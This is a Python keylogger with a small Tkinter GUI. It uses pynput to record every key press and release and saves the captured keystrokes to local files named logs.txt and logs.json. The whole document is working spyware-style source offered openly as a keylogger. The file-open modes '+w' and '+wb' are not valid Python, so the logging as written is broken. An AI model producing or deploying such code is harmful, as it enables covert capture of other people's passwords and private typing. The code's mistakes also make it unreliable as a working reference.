from pynput import keyboard
from pynput.keyboard import Key,Listener
from tkinter import Tk, Label, Button
import json


key_list = []
x = False
key_strokes=""


def update_txt_file(key):

    letter=str(key)
    letter=letter.replace("'","")
    letter=letter.replace("Key.space"," ")
    letter=letter.replace("Key.shift","")
    letter=letter.replace("Key.backspace","<backspace>")
    with open('logs.txt' , '+w') as key_strokes:
        key_strokes.write(letter)                #simple logs are stored in logs.txt
 

def update_json_file (key_list):

    with open('logs.json' , '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)            #detailed logs are stored in logs.json
 

def on_press(key) :

    global x, key_list

    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
        )
        x = True
        if x == True:
            key_list.append(
                {'Held': f'{key}'}
            )
    update_json_file(key_list)
               

def on_release (key):

    global x, key_list,key_strokes
    
    key_list.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x = False

    update_json_file(key_list)

    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))
        
        

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'logs.txt' & 'logs.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger GUI")

label = Label(root, text="Click Start to begin Keylogging.")
label.place(x=100,y=40)

start_button = Button(root, text="Start", command=start_keylogger)
start_button.place(x=140,y=80)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.place(x=200,y=80)

root.geometry("380x200")

root.mainloop()
